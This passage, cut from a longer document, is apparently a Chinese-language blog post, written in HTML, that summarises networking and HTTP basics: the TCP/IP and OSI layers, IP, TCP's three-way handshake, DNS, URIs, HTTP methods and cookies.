<li>&#x5E94;&#x7528;&#x5C42;&#x51B3;&#x5B9A;&#x4E86;&#x5411;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x65F6;&#x901A;&#x4FE1;&#x7684;&#x6D3B;&#x52A8;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x5185;&#x9884;&#x5B58;&#x4E86;&#x5404;&#x7C7B;&#x901A;&#x7528;&#x7684;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x3002;&#x6BD4;&#x5982;&#xFF0C;FTP&#xFF08;File Transfer Protocol&#xFF0C;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#xFF09;&#x548C;DNS&#xFF08;Domain Name System&#xFF0C;&#x57DF;&#x540D;&#x7CFB;&#x7EDF;&#xFF09;&#x670D;&#x52A1;&#x5C31;&#x662F;&#x5176;&#x4E2D;&#x4E24;&#x7C7B;&#x3002;HTTP &#x534F;&#x8BAE;&#x4E5F;&#x5904;&#x4E8E;&#x8BE5;&#x5C42;&#x3002;</li>
<li>&#x4F20;&#x8F93;&#x5C42;&#x5BF9;&#x4E0A;&#x5C42;&#x5E94;&#x7528;&#x5C42;&#xFF0C;&#x63D0;&#x4F9B;&#x5904;&#x4E8E;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x4E2D;&#x7684;&#x4E24;&#x53F0;&#x8BA1;&#x7B97;&#x673A;&#x4E4B;&#x95F4;&#x7684;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x3002;&#x5728;&#x4F20;&#x8F93;&#x5C42;&#x6709;&#x4E24;&#x4E2A;&#x6027;&#x8D28;&#x4E0D;&#x540C;&#x7684;&#x534F;&#x8BAE;&#xFF1A;TCP&#xFF08;Transmission Control Protocol&#xFF0C;&#x4F20;&#x8F93;&#x63A7;&#x5236;&#x534F;&#x8BAE;&#xFF09;&#x548C;UDP&#xFF08;User Data Protocol&#xFF0C;&#x7528;&#x6237;&#x6570;&#x636E;&#x62A5;&#x534F;&#x8BAE;&#xFF09;&#x3002;</li>
<li>&#x7F51;&#x7EDC;&#x5C42;&#x7528;&#x6765;&#x5904;&#x7406;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x6D41;&#x52A8;&#x7684;&#x6570;&#x636E;&#x5305;&#x3002;&#x6570;&#x636E;&#x5305;&#x662F;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x7684;&#x6700;&#x5C0F;&#x6570;&#x636E;&#x5355;&#x4F4D;&#x3002;&#x8BE5;&#x5C42;&#x89C4;&#x5B9A;&#x4E86;&#x901A;&#x8FC7;&#x600E;&#x6837;&#x7684;&#x8DEF;&#x5F84;&#xFF08;&#x6240;&#x8C13;&#x7684;&#x4F20;&#x8F93;&#x8DEF;&#x7EBF;&#xFF09;&#x5230;&#x8FBE;&#x5BF9;&#x65B9;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x5E76;&#x628A;&#x6570;&#x636E;&#x5305;&#x4F20;&#x9001;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x4E0E;&#x5BF9;&#x65B9;&#x8BA1;&#x7B97;&#x673A;&#x4E4B;&#x95F4;&#x901A;&#x8FC7;&#x591A;&#x53F0;&#x8BA1;&#x7B97;&#x673A;&#x6216;&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#x65F6;&#xFF0C;&#x7F51;&#x7EDC;&#x5C42;&#x6240;&#x8D77;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x5728;&#x4F17;&#x591A;&#x7684;&#x9009;&#x9879;&#x5185;&#x9009;&#x62E9;&#x4E00;&#x6761;&#x4F20;&#x8F93;&#x8DEF;&#x7EBF;&#x3002;</li>
<li>&#x94FE;&#x8DEF;&#x5C42;&#x7528;&#x6765;&#x5904;&#x7406;&#x8FDE;&#x63A5;&#x7F51;&#x7EDC;&#x7684;&#x786C;&#x4EF6;&#x90E8;&#x5206;&#x3002;&#x5305;&#x62EC;&#x63A7;&#x5236;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3001;&#x786C;&#x4EF6;&#x7684;&#x8BBE;&#x5907;&#x9A71;&#x52A8;&#x3001;&#x7F51;&#x7EDC;&#x9002;&#x914D;&#x5668;&#xFF0C;&#x5373;&#x7F51;&#x5361; Network Interface Card&#xFF0C;&#x53CA;&#x5149;&#x7EA4;&#x7B49;&#x7269;&#x7406;&#x53EF;&#x89C1;&#x90E8;&#x5206;&#xFF08;&#x8FD8;&#x5305;&#x62EC;&#x8FDE;&#x63A5;&#x5668;&#x7B49;&#x4E00;&#x5207;&#x4F20;&#x8F93;&#x5A92;&#x4ECB;&#xFF09;&#x3002;</li>
</ul>
<h3 id="osi-%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B">OSI &#x4E03;&#x5C42;&#x6A21;&#x578B;</h3>
<p>OSI &#x6A21;&#x578B;&#x662F;&#x56FD;&#x9645;&#x5316;&#x7EC4;&#x7EC7;(ISO)&#x63D0;&#x51FA;&#x7684;&#x4E16;&#x754C;&#x8303;&#x56F4;&#x8BA1;&#x7B97;&#x673A;&#x4E92;&#x8054;&#x6846;&#x67B6;&#x3002;OSI &#x4E03;&#x5C42;&#x6A21;&#x578B;&#x5404;&#x81EA;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0E;&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E0E;&#x76F8;&#x90BB;&#x5C42;&#x63A5;&#x53E3;&#x901A;&#x4FE1;&#x3002;</p>
<pre><code class="language-zsh"># &quot;&#x7269;&#x8054;&#x7F51;&#x6DD1;&#x60E0;&#x8BD5;&#x7528;&quot;
&#x5E94;&#x7528;&#x5C42; =&gt; &#x8868;&#x793A;&#x5C42; =&gt; &#x4F1A;&#x8BDD;&#x5C42; =&gt; &#x4F20;&#x8F93;&#x5C42; =&gt; &#x7F51;&#x7EDC;&#x5C42; =&gt; &#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42; =&gt; &#x7269;&#x7406;&#x5C42;
</code></pre>
<h3 id="%E4%B8%8Ehttp%E5%85%B3%E7%B3%BB%E5%AF%86%E5%88%87%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%9Aip%E3%80%81tcp%E5%92%8Cdns">&#x4E0E;HTTP&#x5173;&#x7CFB;&#x5BC6;&#x5207;&#x7684;&#x534F;&#x8BAE;&#xFF1A;IP&#x3001;TCP&#x548C;DNS</h3>
<ul>
<li>&#x8D1F;&#x8D23;&#x4F20;&#x8F93;&#x7684;IP&#x534F;&#x8BAE;</li>
</ul>
<p>IP&#xFF08;Internet Protocol&#xFF09;&#x7F51;&#x9645;&#x534F;&#x8BAE;&#x4F4D;&#x4E8E;&#x7F51;&#x7EDC;&#x5C42;&#x3002;Internet Protocol &#x8FD9;&#x4E2A;&#x540D;&#x79F0;&#x53EF;&#x80FD;&#x542C;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x5938;&#x5F20;&#xFF0C;&#x4F46;&#x4E8B;&#x5B9E;&#x6B63;&#x662F;&#x5982;&#x6B64;&#xFF0C;&#x56E0;&#x4E3A;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x4F7F;&#x7528;&#x7F51;&#x7EDC;&#x7684;&#x7CFB;&#x7EDF;&#x90FD;&#x4F1A;&#x7528;&#x5230; IP &#x534F;&#x8BAE;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x4E2D;&#x7684; IP &#x6307;&#x7684;&#x5C31;&#x662F;&#x7F51;&#x9645;&#x534F;&#x8BAE;&#xFF0C;&#x534F;&#x8BAE;&#x540D;&#x79F0;&#x4E2D;&#x5360;&#x636E;&#x4E86;&#x4E00;&#x534A;&#x4F4D;&#x7F6E;&#xFF0C;&#x5176;&#x91CD;&#x8981;&#x6027;&#x53EF;&#x89C1;&#x4E00;&#x6591;&#x3002;&#x53EF;&#x80FD;&#x6709;&#x4EBA;&#x4F1A;&#x628A; &quot;IP&quot; &#x548C; &quot;IP&#x5730;&#x5740;&quot; &#x641E;&#x6DF7;&#xFF0C;&quot;IP&quot; &#x5176;&#x5B9E;&#x662F;&#x4E00;&#x79CD;&#x534F;&#x8BAE;&#x7684;&#x540D;&#x79F0;&#x3002;<br>
IP &#x534F;&#x8BAE;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x628A;&#x5404;&#x79CD;&#x6570;&#x636E;&#x5305;&#x4F20;&#x9001;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x800C;&#x8981;&#x4FDD;&#x8BC1;&#x786E;&#x5B9E;&#x4F20;&#x9001;&#x5230;&#x5BF9;&#x65B9;&#x90A3;&#x91CC;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x5404;&#x7C7B;&#x6761;&#x4EF6;&#x3002;&#x5176;&#x4E2D;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x6761;&#x4EF6;&#x662F; IP &#x5730;&#x5740;&#x548C; MAC &#x5730;&#x5740;&#xFF08;Media Access Control Address&#xFF09;&#x3002;<br>
<strong>IP &#x5730;&#x5740;&#x6307;&#x660E;&#x4E86;&#x8282;&#x70B9;&#x88AB;&#x5206;&#x914D;&#x5230;&#x7684;&#x5730;&#x5740;&#xFF0C;MAC&#x5730;&#x5740;&#x662F;&#x6307;&#x7F51;&#x5361;&#x6240;&#x5C5E;&#x7684;&#x56FA;&#x5B9A;&#x5730;&#x5740;&#x3002;</strong> IP &#x5730;&#x5740;&#x53EF;&#x4EE5;&#x548C; MAC &#x5730;&#x5740;&#x8FDB;&#x884C;&#x914D;&#x5BF9;&#x3002;IP&#x5730;&#x5740;&#x53EF;&#x53D8;&#x6362;&#xFF0C;&#x4F46; MAC &#x5730;&#x5740;&#x57FA;&#x672C;&#x4E0A;&#x4E0D;&#x4F1A;&#x66F4;&#x6539;&#x3002;</p>
<ul>
<li>&#x786E;&#x4FDD;&#x53EF;&#x9760;&#x6027;&#x7684;TCP&#x534F;&#x8BAE;</li>
</ul>
<p>&#x6309;&#x5C42;&#x6B21;&#x5206;&#xFF0C;TCP &#x4F4D;&#x4E8E;&#x4F20;&#x8F93;&#x5C42;&#xFF0C;&#x63D0;&#x4F9B;&#x53EF;&#x9760;&#x7684;&#x5B57;&#x8282;&#x6D41;&#x670D;&#x52A1;&#x3002;&#x6240;&#x8C13;&#x7684;&#x5B57;&#x8282;&#x6D41;&#x670D;&#x52A1;&#xFF08;Byte Stream Service&#xFF09;&#x662F;&#x6307;&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x4F20;&#x8F93;&#xFF0C;&#x5C06;&#x5927;&#x5757;&#x6570;&#x636E;&#x5206;&#x5272;&#x6210;&#x4EE5;&#x62A5;&#x6587;&#x6BB5;&#xFF08;segment&#xFF09;&#x4E3A;&#x5355;&#x4F4D;&#x7684;&#x6570;&#x636E;&#x5305;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;&#x4E00;&#x8A00;&#x4EE5;&#x853D;&#x4E4B;&#xFF0C;TCP&#x534F;&#x8BAE;&#x4E3A;&#x4E86;&#x66F4;&#x5BB9;&#x6613;&#x4F20;&#x9001;&#x5927;&#x6570;&#x636E;&#x624D;&#x628A;&#x6570;&#x636E;&#x5206;&#x5272;&#xFF0C;&#x800C;&#x4E14;TCP&#x534F;&#x8BAE;&#x80FD;&#x591F;&#x786E;&#x8BA4;&#x6570;&#x636E;&#x6700;&#x7EC8;&#x662F;&#x5426;&#x9001;&#x8FBE;&#x5230;&#x5BF9;&#x65B9;&#x3002;</p>
<p>&#x4E3A;&#x51C6;&#x786E;&#x65E0;&#x8BEF;&#x5730;&#x5C06;&#x6570;&#x636E;&#x9001;&#x8FBE;&#x76EE;&#x6807;&#x5904;&#xFF0C;TCP &#x534F;&#x8BAE;&#x91C7;&#x7528;&#x4E09;&#x6B21;&#x63E1;&#x624B; three-way handshaking &#x7B56;&#x7565;&#x3002;&#x7528; TCP &#x534F;&#x8BAE;&#x628A;&#x6570;&#x636E;&#x5305;&#x9001;&#x51FA;&#x53BB;&#x540E;&#xFF0C;TCP &#x4E0D;&#x4F1A;&#x5BF9;&#x4F20;&#x9001;&#x540E;&#x7684;&#x60C5;&#x51B5;&#x7F6E;&#x4E4B;&#x4E0D;&#x7406;&#xFF0C;&#x5176;&#x4E00;&#x5B9A;&#x4F1A;&#x5411;&#x5BF9;&#x65B9;&#x786E;&#x8BA4;&#x662F;&#x5426;&#x6210;&#x529F;&#x9001;&#x8FBE;&#x3002;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;TCP&#x7684;&#x6807;&#x5FD7;flag &#x2014;&#x2014; SYN synchronize &#x548C;ACK acknowledgement&#x3002;</p>
<p>&#x53D1;&#x9001;&#x7AEF;&#x9996;&#x5148;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5E26; SYN &#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x63A5;&#x6536;&#x7AEF;&#x6536;&#x5230;&#x540E;&#x56DE;&#x4F20;&#x4E00;&#x4E2A;&#x5E26;&#x6709; SYN/ACK &#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x4EE5;&#x793A;&#x4F20;&#x8FBE;&#x786E;&#x8BA4;&#x4FE1;&#x606F;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x53D1;&#x9001;&#x7AEF;&#x518D;&#x56DE;&#x4F20;&#x4E00;&#x4E2A;&#x5E26; ACK &#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x4EE3;&#x8868;&quot;&#x63E1;&#x624B;&quot;&#x7ED3;&#x675F;&#x3002;&#x82E5;&#x5728;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x67D0;&#x4E2A;&#x9636;&#x6BB5;&#x83AB;&#x540D;&#x4E2D;&#x65AD;&#xFF0C;TCP &#x534F;&#x8BAE;&#x4F1A;&#x518D;&#x6B21;&#x4EE5;&#x76F8;&#x540C;&#x7684;&#x987A;&#x5E8F;&#x53D1;&#x9001;&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#x5305;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/three-way-handshaking.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<ul>
<li>&#x8D1F;&#x8D23;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;DNS&#x670D;&#x52A1;</li>
</ul>
<p>DNS&#xFF08;Domain Name System&#xFF09;&#x670D;&#x52A1;&#x662F;&#x548C;HTTP&#x534F;&#x8BAE;&#x4E00;&#x6837;&#x4F4D;&#x4E8E;&#x5E94;&#x7528;&#x5C42;&#x7684;&#x534F;&#x8BAE;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x57DF;&#x540D;&#x5230;IP&#x5730;&#x5740;&#x4E4B;&#x95F4;&#x7684;&#x89E3;&#x6790;&#x670D;&#x52A1;&#x3002;&#x8BA1;&#x7B97;&#x673A;&#x65E2;&#x53EF;&#x4EE5;&#x88AB;&#x8D4B;&#x4E88;IP&#x5730;&#x5740;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x88AB;&#x8D4B;&#x4E88;&#x4E3B;&#x673A;&#x540D;&#x548C;&#x57DF;&#x540D;&#x3002;&#x6BD4;&#x5982;www.hackr.jp&#x3002;<br>
&#x7528;&#x6237;&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x540D;&#x6216;&#x57DF;&#x540D;&#x6765;&#x8BBF;&#x95EE;&#x5BF9;&#x65B9;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x901A;&#x8FC7;IP&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x3002;&#x56E0;&#x4E3A;&#x4E0E;IP&#x5730;&#x5740;&#x7684;&#x4E00;&#x7EC4;&#x7EAF;&#x6570;&#x5B57;&#x76F8;&#x6BD4;&#xFF0C;&#x7528;&#x5B57;&#x6BCD;&#x914D;&#x5408;&#x6570;&#x5B57;&#x7684;&#x8868;&#x793A;&#x5F62;&#x5F0F;&#x6765;&#x6307;&#x5B9A;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#x66F4;&#x7B26;&#x5408;&#x4EBA;&#x7C7B;&#x7684;&#x8BB0;&#x5FC6;&#x4E60;&#x60EF;&#x3002;DNS&#x534F;&#x8BAE;&#x63D0;&#x4F9B;&#x901A;&#x8FC7;&#x57DF;&#x540D;&#x67E5;&#x627E;IP&#x5730;&#x5740;&#xFF0C;&#x6216;&#x9006;&#x5411;&#x4ECE;IP&#x5730;&#x5740;&#x53CD;&#x67E5;&#x57DF;&#x540D;&#x7684;&#x670D;&#x52A1;&#x3002;</p>
<h3 id="uri%E5%92%8Curl">URI&#x548C;URL</h3>
<p>URL&#x6B63;&#x662F;&#x4F7F;&#x7528;Web&#x6D4F;&#x89C8;&#x5668;&#x7B49;&#x8BBF;&#x95EE;Web&#x9875;&#x9762;&#x65F6;&#x9700;&#x8981;&#x8F93;&#x5165;&#x7684;&#x7F51;&#x9875;&#x5730;&#x5740;&#x3002;URI&#x662F;Uniform Resource Identifier&#x7684;&#x7F29;&#x5199;&#x662F;&#x7531;&#x67D0;&#x4E2A;&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x8868;&#x793A;&#x7684;&#x8D44;&#x6E90;&#x7684;&#x5B9A;&#x4F4D;&#x6807;&#x8BC6;&#x7B26;&#x3002;&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x662F;&#x6307;&#x8BBF;&#x95EE;&#x8D44;&#x6E90;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x540D;&#x79F0;&#x3002;&#x91C7;&#x7528;HTTP&#x534F;&#x8BAE;&#x65F6;&#xFF0C;&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x5C31;&#x662F;http&#x3002;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x6709;ftp&#x3001;mailto&#x3001;telnet&#x3001;file&#x7B49;&#x3002;&#x6807;&#x51C6;&#x7684;URI&#x534F;&#x8BAE;&#x65B9;&#x6848;&#x6709;30&#x79CD;&#x5DE6;&#x53F3;&#x3002;URI&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x6807;&#x8BC6;&#x67D0;&#x4E00;&#x4E92;&#x8054;&#x7F51;&#x8D44;&#x6E90;&#xFF0C;&#x800C;URL&#x8868;&#x793A;&#x8D44;&#x6E90;&#x7684;&#x5730;&#x70B9;&#xFF08;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x6240;&#x5904;&#x7684;&#x4F4D;&#x7F6E;&#xFF09;&#x3002;&#x53EF;&#x89C1;URL&#x662F;URI&#x7684;&#x5B50;&#x96C6;&#x3002;</p>
<h2 id="%E7%AE%80%E5%8D%95%E7%9A%84http%E5%8D%8F%E8%AE%AE">&#x7B80;&#x5355;&#x7684;HTTP&#x534F;&#x8BAE;</h2>
<p>HTTP&#x534F;&#x8BAE;&#x89C4;&#x5B9A;&#xFF0C;&#x8BF7;&#x6C42;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x51FA;&#xFF0C;&#x6700;&#x540E;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x54CD;&#x5E94;&#x8BE5;&#x8BF7;&#x6C42;&#x5E76;&#x8FD4;&#x56DE;&#x3002;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x80AF;&#x5B9A;&#x662F;&#x5148;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x5F00;&#x59CB;&#x5EFA;&#x7ACB;&#x901A;&#x4FE1;&#x7684;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5728;&#x6CA1;&#x6709;&#x63A5;&#x6536;&#x5230;&#x8BF7;&#x6C42;&#x4E4B;&#x524D;&#x4E0D;&#x4F1A;&#x53D1;&#x9001;&#x54CD;&#x5E94;&#x3002;</p>
<p>&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x662F;&#x7531;&#x8BF7;&#x6C42;&#x65B9;&#x6CD5;&#x3001;&#x8BF7;&#x6C42;URI&#x3001;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x3001;&#x53EF;&#x9009;&#x7684;&#x8BF7;&#x6C42;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x548C;&#x5185;&#x5BB9;&#x5B9E;&#x4F53;&#x6784;&#x6210;&#x7684;&#x3002;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x57FA;&#x672C;&#x4E0A;&#x7531;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x3001;&#x72B6;&#x6001;&#x7801;&#xFF08;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x6210;&#x529F;&#x6216;&#x5931;&#x8D25;&#x7684;&#x6570;&#x5B57;&#x4EE3;&#x7801;&#xFF09;&#x3001;&#x7528;&#x4EE5;&#x89E3;&#x91CA;&#x72B6;&#x6001;&#x7801;&#x7684;&#x539F;&#x56E0;&#x77ED;&#x8BED;&#x3001;&#x53EF;&#x9009;&#x7684;&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x4EE5;&#x53CA;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x6784;&#x6210;&#x3002;</p>
<p>GET&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;&#x5DF2;&#x88AB;URI&#x8BC6;&#x522B;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x6307;&#x5B9A;&#x7684;&#x8D44;&#x6E90;&#x7ECF;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x89E3;&#x6790;&#x540E;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x5185;&#x5BB9;&#x3002;POST&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x4F20;&#x8F93;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x3002;&#x867D;&#x8BF4;POST&#x7684;&#x529F;&#x80FD;&#x4E0E;GET&#x5F88;&#x76F8;&#x4F3C;&#xFF0C;&#x4F46;POST&#x7684;&#x4E3B;&#x8981;&#x76EE;&#x7684;&#x5E76;&#x4E0D;&#x662F;&#x83B7;&#x53D6;&#x54CD;&#x5E94;&#x7684;&#x4E3B;&#x4F53;&#x5185;&#x5BB9;&#x3002;PUT&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x3002;&#x5C31;&#x50CF;FTP&#x534F;&#x8BAE;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x4E00;&#x6837;&#xFF0C;&#x8981;&#x6C42;&#x5728;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x7684;&#x4E3B;&#x4F53;&#x4E2D;&#x5305;&#x542B;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x7136;&#x540E;&#x4FDD;&#x5B58;&#x5230;&#x8BF7;&#x6C42;URI&#x6307;&#x5B9A;&#x7684;&#x4F4D;&#x7F6E;&#x3002;HEAD&#x65B9;&#x6CD5;&#x548C;GET&#x65B9;&#x6CD5;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x662F;&#x4E0D;&#x8FD4;&#x56DE;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x3002;&#x7528;&#x4E8E;&#x786E;&#x8BA4;URI&#x7684;&#x6709;&#x6548;&#x6027;&#x53CA;&#x8D44;&#x6E90;&#x66F4;&#x65B0;&#x7684;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7B49;&#x3002;DELETE&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x5220;&#x9664;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x4E0E;PUT&#x76F8;&#x53CD;&#x7684;&#x65B9;&#x6CD5;&#x3002;DELETE&#x65B9;&#x6CD5;&#x6309;&#x8BF7;&#x6C42;URI&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x8D44;&#x6E90;&#x3002;OPTIONS&#x65B9;&#x6CD5;&#x7528;&#x6765;&#x67E5;&#x8BE2;&#x9488;&#x5BF9;&#x8BF7;&#x6C42;URI&#x6307;&#x5B9A;&#x7684;&#x8D44;&#x6E90;&#x652F;&#x6301;&#x7684;&#x65B9;&#x6CD5;&#x3002;TRACE&#x65B9;&#x6CD5;&#x662F;&#x8BA9;Web&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x8BF7;&#x6C42;&#x901A;&#x4FE1;&#x73AF;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x65B9;&#x6CD5;&#x3002;CONNECT&#x65B9;&#x6CD5;&#x8981;&#x6C42;&#x5728;&#x4E0E;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x65F6;&#x5EFA;&#x7ACB;&#x96A7;&#x9053;&#xFF0C;&#x5B9E;&#x73B0;&#x7528;&#x96A7;&#x9053;&#x534F;&#x8BAE;&#x8FDB;&#x884C;TCP&#x901A;&#x4FE1;&#x3002;</p>
<h3 id="%E4%BD%BF%E7%94%A8cookie%E7%9A%84%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86">&#x4F7F;&#x7528;Cookie&#x7684;&#x72B6;&#x6001;&#x7BA1;&#x7406;</h3>
<p>&#x4E0D;&#x53EF;&#x5426;&#x8BA4;&#xFF0C;&#x65E0;&#x72B6;&#x6001;&#x534F;&#x8BAE;&#x5F53;&#x7136;&#x4E5F;&#x6709;&#x5B83;&#x7684;&#x4F18;&#x70B9;&#x3002;&#x7531;&#x4E8E;&#x4E0D;&#x5FC5;&#x4FDD;&#x5B58;&#x72B6;&#x6001;&#xFF0C;&#x81EA;&#x7136;&#x53EF;&#x51CF;&#x5C11;&#x670D;&#x52A1;&#x5668;&#x7684;CPU&#x53CA;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#x7684;&#x6D88;&#x8017;&#x3002;Cookie&#x6280;&#x672F;&#x901A;&#x8FC7;&#x5728;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x5199;&#x5165;Cookie&#x4FE1;&#x606F;&#x6765;&#x63A7;&#x5236;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x72B6;&#x6001;&#x3002;Cookie&#x4F1A;&#x6839;&#x636E;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x5185;&#x7684;&#x4E00;&#x4E2A;&#x53EB;&#x505A;Set-Cookie&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x4FE1;&#x606F;&#xFF0C;&#x901A;&#x77E5;&#x5BA2;&#x6237;&#x7AEF;&#x4FDD;&#x5B58;Cookie&#x3002;&#x5F53;&#x4E0B;&#x6B21;&#x5BA2;&#x6237;&#x7AEF;&#x518D;&#x5F80;&#x8BE5;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x81EA;&#x52A8;&#x5728;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x4E2D;&#x52A0;&#x5165;Cookie&#x503C;&#x540E;&#x53D1;&#x9001;&#x51FA;&#x53BB;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x73B0;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;Cookie&#x540E;&#xFF0C;&#x4F1A;&#x53BB;&#x68C0;&#x67E5;&#x7A76;&#x7ADF;&#x662F;&#x4ECE;&#x54EA;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x6765;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x6BD4;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x6700;&#x540E;&#x5F97;&#x5230;&#x4E4B;&#x524D;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x3002;</p>
<h2 id="http%E6%8A%A5%E6%96%87%E5%86%85%E7%9A%84http%E4%BF%A1%E6%81%AF">HTTP&#x62A5;&#x6587;&#x5185;&#x7684;HTTP&#x4FE1;&#x606F;</h2>
